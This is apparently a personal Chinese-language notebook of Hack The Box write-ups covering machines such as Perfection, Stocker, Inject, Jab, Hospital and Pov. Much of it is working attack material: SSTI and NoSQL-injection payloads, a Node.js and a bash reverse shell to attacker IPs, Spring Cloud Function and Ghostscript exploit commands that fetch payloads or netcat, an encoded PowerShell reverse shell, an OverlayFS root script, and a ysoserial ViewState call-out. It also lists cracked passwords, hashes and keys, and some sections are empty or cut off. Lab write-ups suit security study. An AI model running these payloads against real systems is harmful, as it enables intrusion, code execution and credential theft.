# HTB

[toc]
## StartPoint
### Archetype
扫到了1433端口,使用
```bash

```

> -N : No password
  -L : This option allows you to look at what services are available on a server


## Easy

### Perfection
#### user
nmap:
```bash
Nmap scan report for 10.10.11.253
Host is up (6.5s latency).
Not shown: 65076 filtered tcp ports (no-response), 457 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307143815.png)
webrick 1.7.0 ,一个ruby的web框架

输出成绩会回显,尝试ruby的`ssti`payload `<%= 7*7 %>`
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307151037.png)

注意需要 `a%0A<%= 7*7 %>` 绕过waf检测


```bash
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

成功拿到shell
![image.png|475](https://gitee.com/leiye87/typora_picture/raw/master/20240307152200.png)

在`/var/mail/susan`里有如下内容
```text
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

即使用新的密码,再加上之前读到的sqlite3.db文件,可以破解密码

`hashcat -a 3 -m 1400 hashes.txt  susan_nasus_?d?d?d?d?d?d?d?d?d`

内存不够,先跳过

### Sau
#### user

nmap:
![image](https://i.imgur.com/UMFB7tm.png)

先访问55555这个端口
跟个webhook一样的东西`request basket`
可以找到`CVE-2023-27163`存在ssrf
#ssrf
[doc](https://notes.sjtu.edu.cn/s/MUUhEymt7)
```shell
 curl --location 'http://10.10.11.224:55555/api/baskets/mahesh' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```

通过这个我们可以访问靶机的80端口
发现是`Maltrail (v0.53)`,在登录处存在命令注入
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722000626.png)

#### root
`sudo -l`查看权限
![image](https://i.imgur.com/gnBjgR6.png)

在`GTOBins`上可以systemctl看到提权
执行后类似于`less`命令,可以使用`!sh`提权

1. `script /dev/null /bin/bash`
> script /dev/null /bin/bash 命令的作用是启动一个新的 Bash 会话，并将所有的输出和输入重定向到 /dev/null 设备。这个命令通常用于在不产生任何输出的情况下启动一个新的 Bash shell。


2. `sudo /usr/bin/systemctl status trail.service`
3. `!sh`
![image](https://i.imgur.com/rJx8uZg.png)
### Stocker

#### user

nmap:

![image-20230320162937220](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230320162937220.png)

80：

爆破子域名 `dev`

修改hosts，并且访问，发现是一个登录框

`noSQL` 绕过

```
Basic authentication bypass

Using not equal ($ne) or greater ($gt)

in URL

username[$ne]=toto&password[$ne]=toto

username[$regex]=.*&password[$regex]=.*

username[$exists]=true&password[$exists]=true



in JSON

{"username": {"$ne": null}, "password": {"$ne": null} }

{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }

{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

成功绕过登录
发现可以购物，随便购买后发现存在生成的 `购物清单`

```url
http://dev.stocker.htb/api/po/返回的uuid
```

生成的pdf里会有我们传过去的参数，修改 `title`参数为 

```html
<iframe src=file:///etc/passwd height=800px weight=1200px ></iframe>
```

即可在生成的pdf看到生成的文件，存在一个任意文件读取

因为是nginx服务器，读取配置文件

```
/etc/nginx/nginx.conf
```

发现根目录为

```
/var/www/dev
```

nodejs主文件

```
{app|index|main}.js
```

测试可以读到 `index.js`

泄露了 dev用户信息 ,但是由于passwd里不存在dev用户,改用另一个 `angoose`成功登录

* user 33fbd350c4b54660da6d5e2526765848

#### root

`sudo -l`

![image-20230320210055306](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230320210055306.png)

我们可以执行 `node`目录的限定可以以穿梭绕过

生成一个nodejs反弹shell

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.16.15", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

* 没有任何模块所以无法使用 `child_process`

 成功拿到ROOT

* root 694c4e17c18faa76abf6f117765018e3

### Inject

#### user

nmap:



![image-20230318191333798](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230318191333798.png)

22：弱口令

8080：web服务，也就是从这里开始渗透

访问后发现只有上传一个功能点，随便上传一个图片，在viewimg功能下发现存在任意文件读取

```url
http://10http://10.10.11.204:8080/show_image?img=../../../../../../../
```

但是由于不知道功能点，没法读取，看了一眼wp

```
/show_image?img=../../../../../../../etc/systemd/system/webapp.service
```

* 在这里读取配置文件 
* 呆住了，读取目录会返回目录下的文件夹和文件 

reply

这是一个maven项目，目录结构

> 下一节记录 Maven 期望的目录布局和 Maven 创建的目录布局。尽量符合这个结构。但是，如果不能，可以通过项目描述符覆盖这些设置。
>
> | `src/main/java`      | 应用程序/库源                |
> | -------------------- | ---------------------------- |
> | `src/main/resources` | 应用/图书馆资源              |
> | `src/main/filters`   | 资源过滤文件                 |
> | `src/main/webapp`    | Web 应用程序源               |
> | `src/test/java`      | 测试源                       |
> | `src/test/resources` | 测试资源                     |
> | `src/test/filters`   | 测试资源过滤文件             |
> | `src/it`             | 集成测试（主要用于插件）     |
> | `src/assembly`       | 程序集描述符                 |
> | `src/site`           | 地点                         |
> | `LICENSE.txt`        | 项目许可证                   |
> | `NOTICE.txt`         | 项目依赖的库需要的声明和属性 |
> | `README.txt`         | 项目的自述文件               |
>
> 在顶层，描述项目的文件：文件`pom.xml`。此外，还有一些文本文档可供用户在收到源代码后立即阅读：`README.txt`、`LICENSE.txt`等。
>
> 这个结构只有两个子目录：`src`和`target`。此处预期的唯一其他目录是元数据，如`CVS`、`.git`或`.svn`，以及多项目构建中的任何子项目（每个子项目都将按上述方式布局）。
>
> 该`target`目录用于存放构建的所有输出。
>
> 该`src`目录包含用于构建项目、项目站点等的所有源材料。它包含每种类型的子目录：`main`主要构建工件、`test`单元测试代码和资源`site`等。
>
> 在工件生成源目录（即`main`和`test`）中，有一个目录用于语言`java`（在其下存在正常的包层次结构），另一个用于`resources`（在给定默认资源定义的情况下复制到目标类路径的结构）。
>
> 如果有其他对工件构建有贡献的来源，它们将位于其他子目录下。例如`src/main/antlr`将包含 Antlr 语法定义文件。



* ```
  [Unit]
  Description=Spring WEb APP
  After=syslog.target
  
  [Service]
  User=frank
  Group=frank
  ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar
  Restart=always
  StandardOutput=syslog
  StandardError=syslog
  
  [Install]
  WantedBy=multi-user.target
  
  ```

所以下一步就是下载这个jar文件，审计网站源码

byd下载真慢

下载中断了，事实上并不需要下载

> maven 项目的一个重要部分是 pom.xml 文件，用于定义项目的所有特征和编译、打包和部署项目所需的依赖项

下载 `WebApp` 下的pom.xml文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.6.5</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
    	
        <groupId>com.example</groupId>
        <artifactId>WebApp</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>WebApp</name>
        <description>Demo project for Spring Boot</description>
        <properties>
                <java.version>11</java.version>
        </properties>
        <dependencies>
                <dependency>
                        <groupId>com.sun.activation</groupId>
                        <artifactId>javax.activation</artifactId>
                        <version>1.2.0</version>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <scope>runtime</scope>
                        <optional>true</optional>
                </dependency>

                <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                        <scope>test</scope>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>bootstrap</artifactId>
                        <version>5.1.3</version>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>webjars-locator-core</artifactId>
                </dependency>

        </dependencies>
        <build>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                                <version>${parent.version}</version>
                        </plugin>
                </plugins>
                <finalName>spring-webapp</finalName>
        </build>

</project>
```

可以发现使用了3.2.2版本的springframework.boot

存在 相关 [CVE-2022-22963](https://kalilinuxtutorials.com/cve-2022-22963/) 漏洞

> ###### 恶意 Spring Expression 在 Spring Cloud Function 中远程执行代码

poc

```shell
 curl -X POST  http://$IP:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget $YOUR_IP -O /tmp/shell.sh ")' --data-raw 'data' -vva
```

在我们kali `/tmp` 下新建一个 `shell.sh`文件,并且 `python -m http.server 80` 开启http,让靶机访问并下载shell,本地监听端口

* shell.sh

* ```shell
  bash -i >& /dev/tcp/10.10.11.46/4444 0>&1
  ```

再让靶机执行shell.sh

```shell
 curl -X POST  http://$IP:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell.sh")' --data-raw 'data' -vva
```

本地接收到 `frank ` 的shell

第一步,横向到`/home` 的phil用户

```shell
cd ~
//查看当前目录下所有文件和子文件
find .
cat ./.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

成功得到 `phil`的密码 DocPhillovestoInject123

* user 04193d0e310fefcea681b1047fb507f5

#### root

跟着wp迷迷糊糊拿到了

```shell
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
//查看组可访问的特殊权限
find / -group staff 2>/dev/null
...
/opt/automation/tasks
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
...
```

> 使用 pspy 我发现了一个似乎每 3 分钟运行一次的 cronjob，并在目录**/opt/automation/tasks上执行ansible-parallel**

> Ansible Parallel 用于同时运行多个剧本。所以我猜 cronjob 正在做类似的事情
>
> ```shell
> /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/*
> ```

nnd这怎么发现的?? 整个pspy先

也就是说这个脚本每隔一段时间会运行 `/opt/automation/tasks/*`下的yml文件,只要我们新建一个

`shell.yml`文件

```shell
echo '[{hosts: localhost, tasks: [shell: /usr/bin/chmod +s /bin/bash]}]' >> /opt/automation/tasks/shell.yml
```

等几分钟后就 运行 `bash -p`就会成为root

* root 6b90bf771b3bca6f236cef43ae88773d



### keeper
#### user
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231025150542.png)

- 80
添加
`10.10.11.227 tickets.keeper.htb` 到/etc/hosts

## Medium

### Runner
https://breachforums.st/Thread-HackTheBox-Runner-Writeup?highlight=runner
`10.10.11.13`

```bash
22/tcp open  ssh
80/tcp open  http
8000/tcp open  http-alt
```

#### user

目录扫描,无
子域名爆破 webproxy.runner

8000端口目录扫描
```bash
200      GET        1l        1w        3c http://10.10.11.13:8000/health
200      GET        1l        1w        9c http://10.10.11.13:8000/version
```

看了眼提示,使用gobuster vhost爆破虚拟主机
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422014054.png)

什么也没爆出来
使用cewl生成的字典也没爆出来

---

看题解还是用dns子域名扫到的teamcity这个子域名?
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422024259.png)


发现是jetbrains的一个teamcity服务器,搜索2023.05.4 存在一个` CVE-2023-42793`
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422024653.png)

使用`searchsploit`可以直接搜索到这个漏洞,但是我是用kali没成功,换到win上成功了(代码没变),跟vpn连接的位置有关?
得到一个admin账号密码 `city_adminkIxr`/`Main_password!!**`

---
好像是因为共享靶机跳过了一步,需要配置rest.debug.processes.enable开启
https://www.ctfiot.com/141977.html
```bash
curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UmFYd29SRVlLUzd3RUNIa1Jpem81MkNfZjlN.ZjhjZDljNzktNDFiMS00OGE2LWE2ZDQtNzcwOGQ1ZjRhNWU2" -X POST http://192.168.86.50:8111/admin/dataDir.html?action=edit^&fileName=config%2Finternal.properties^&content=rest.debug.processes.enable=true
```

```bash
curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UmFYd29SRVlLUzd3RUNIa1Jpem81MkNfZjlN.ZjhjZDljNzktNDFiMS00OGE2LWE2ZDQtNzcwOGQ1ZjRhNWU2" http://192.168.86.50:8111/admin/admin.html?item=diagnostics^&tab=dataDir^&file=config/internal.properties

```


通过后台rce,找到一个ruby的代码,根据代码和报错构造了一下web请求
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422033608.png)
要添加一个`X-TC-CSRF-Token`头,随便给个值真正的值他就会告诉你,防止csrf的



反弹一个shell

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422033655.png)

是一台teamcity的docker,,,

---
在teamcity服务器有一个backup功能,我们可以下载这个文件,grep 搜索得到一个账号密码hash

```bash
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1713754856071, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1713750060868, BCRYPT
11, city_adminzit0, $2a$07$uhiHIIlWAMbr3q9X8tpxruA7v03OX5k7iohHN0apWvAEBfyUttRZu, , angry-admin@funnybunny.org, 1713750320820, BCRYPT
12, h454nsec8058, $2a$07$hZ9GPUR80DrAP3JYnAi6rujjwotpkSH71tx0H75Dv21WQwzHYlLG6, , "", 1713749135558, BCRYPT
13, city_admin1bzq, $2a$07$L9YdCjMQ.gseuguV5HmrRuEVewGra0Fznx3oJQUrhxWdjtMY1Trv6, , angry-admin@funnybunny.org, , BCRYPT
14, city_adminadwl, $2a$07$Yma2SIZwAYSOTN89inPEb.n15cYCYQMEkpXx0hEqQg2Dr8cyWn0JG, , angry-admin@funnybunny.org, 1713754459173, BCRYPT
15, city_admins1yx, $2a$07$6Ib6KdMJ8TXPELV85WM0euQI9kPNJqwZ8kjFWWEIs0kbvemUz4RHq, , angry-admin@funnybunny.org, , BCRYPT
16, city_adminkixr, $2a$07$zaG4Wv2MR7B1plCc3y1o.ewQrt6DI0sis0rQUS05.mkxSzsnxOCrq, , angry-admin@funnybunny.org, 1713755037439, BCRYPT
```

使用hashcat破解
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422121119.png)

得到`matthew`matthew的密码 `piper123`
搜索ssh公钥得到 `find -name "*id_rsa*" `得到一个ssh公钥

`ssh -i john@10.10.11.13`成功登录john用户
得到
`5e665c01113d93236c4333a879598c27`

#### root

linpeas.sh找到一个反向代理
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422123253.png)


![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422123457.png)

使用上面mattrew用户登录上去
是一个管理docker的网站

> Portainer.io
> Community Edition
> 2.19.4


### Jab
#### user
#win 
- nmap
```bash
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5222/tcp open  xmpp-client
5269/tcp open  xmpp-server
7070/tcp open  realserver
7443/tcp open  oracleas-https
7777/tcp open  cbt
```

7070,7443是web服务
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240412212618.png)
扫到一个ws路由,返回405,尝试其他方法
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240412213010.png)

支持的请求方法`CANCELUPLOAD,HEAD,MKCOL,UNCHECKOUT,POST,CHECKIN,CHECKOUT,PROPFIND,LOCK,VERSION-CONTROL,COPY,REPORT,OPTIONS,PUT,DELETE,GETLIB,MOVE,GET,UPDATE,PROPPATCH,UNLOCK`

可以看到xmpp-server和client,google下是什么
> XMPP is the Extensible Messaging and Presence Protocol, a set of open technologies for instant messaging, presence, multi-party chat, voice and video calls, collaboration, lightweight middleware, content syndication, and generalized routing of XML data.
> XMPP是可扩展消息和呈现协议，是一组用于即时消息、呈现、多方聊天、语音和视频通话、协作、轻量级中间件、内容联合和XML数据通用路由的开放技术。

官网可以看到使用scansion与这个协议交互

---
针对xmpp与jabber,类似于discord的聊天服务器,使用pidgin交互
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240412234029.png)
开启了88端口,使用kerbrure枚举用户+getnpusers获取hash
得到一个`jmontgomery`用户的hash
`hashcat.exe ./hashes D:\dict`
得到密码
`Midnight_121`

登录上服务器后在room list找到一个pentest小组,得到了一个账号密码
`svc_openfire` `!@#$%^&*(1qazxsw`

枚举smb share
`crackmapexec smb -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' --shares jab.htb`
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413001639.png)
只读,没什么用

转战rpc服务
使用rpcclient

```bash

```

```bash
impacket-dcomexec -object MMC20 jab.htb/svc_openfire:"$password"@10.10.11.4 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand
```

反弹shell,为什么要用dcomexec???
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413003210.png)

#### root
通过内网穿透访问9090页面,proxifier设置socks5代理

使用svc那个用户登录,搜索openfire相关漏洞得到`CVE-2023-32315`

发现存在目录穿梭可以新建一个administrator用户,再上传一个jar包插件,实现rce(好像svc这个用户就可以直接传插件,svc也是admin)
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413014239.png)

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413014411.png)


### Hospital
#win
#### user
`10.10.11.241`
- nmap
```text
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
6409/tcp open  boe-resssvr3
6635/tcp open  mpls-udp
8080/tcp open  http-proxy
```
开启了5985,支持winrm访问
`22,53,88,135,139,443,445,464,1801,2103,2105,2107,3389,5985,6409,6635,8080`

- 8080
可以上传文件,在uploads目录下 .htaccess无法利用
可以上传phar ...
传了一个命令行的webshell,放在uploads目录下

- 提权,搜索linux 5.19.0 privilege escalation,基本都指向了CVE-2023-2640 & CVE-2023-32629 这俩个漏洞
exp

```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240406222712.png)

当前靶机是window,这台是wsl,需要横向
查看/etc/shadow得到
`drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1      tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::`
使用hashcat得到密码
`qwe123!@#`

- 443
Hospital Webmail
`Roundcube Webmail` 这个框架 
使用上面得到的账号密码 `drwilliams`/`qwe123!@#`登录

有个人发来一封邮件要我们写一个ghost脚本文件(基于adobe,postscript及pdf的界面描述语言),后缀为eps
可以在eps文件里进行命令注入
使用这个[项目](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
```bash
python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.37:8000/nc64.exe -o nc64.exe" --filename file.eps
```
回复邮件,附带这个eps文件
```bash
python3 CVE_2023_36664_exploit.py --inject --payload "nc64.exe 10.10.16.37 4444 -e cmd.exe" --filename file.eps
```
反弹shell

#### root
得到初始访问
在Document目录下有一个ghostscript.bat
```powershell
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```
> 这个命令的目的是在远程计算机上使用指定的凭据对象，在Ghostscript的安全环境下执行给定的EPS文件处理命令。请注意，这个命令中的一些路径和参数是根据具体环境和需求进行了示例设置，您可能需要根据实际情况进行修改。

可以看到一个密码`chr!$br0wn`,猜测是用户`drbrown`的
使用`rpcclient`登录  why???

```bash
rpcclient -U "drbrown" 10.10.11.241
```

列出所有用户
`querydispinfo`
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240408004802.png)

admin与guest开启了共享
![Uploading file...1vosh]()

所以在`C:\xampp\htdocs`上传一个webshell即可拿到root

还有一个解是winpeas扫出来存在一个定时任务,里面有admin的密码


### Pov
#win
#### user
- nmap端口扫描
```text
PORT   STATE SERVICE
80/tcp open  http
```
- nmap 80服务扫描
```text

```

只开了一个80端口


80端口只是一个html,目录扫描也没有什么东西


`gobuster vhost -u http://pov.htb/ -t 35 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --append-domain -k --no-error`
子域名扫描到 dev.pov.htb
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240309200053.png)

有一个下载文件的接口,发现可以输入路径,存在双写绕过
把网页的后端代码下载下来`index.aspx.cs`
- 下载`/web.config`应该是web根目录的配置文件
```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

[ViewState反序列化攻击](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter)

关键是要寻找`MachineKey`,在pentest/Vuln/asp下的俩个工具都尝试了
可以利用工具[ysoserial.net](https://github.com/pwntester/ysoserial.net.git)来攻击
```bash
.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.26:4444/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```


![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240309213933.png)
成功收到请求
然后弹个shell回来

在Documents文件夹下有一个connection.xml文件,需要解密
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

```powershell
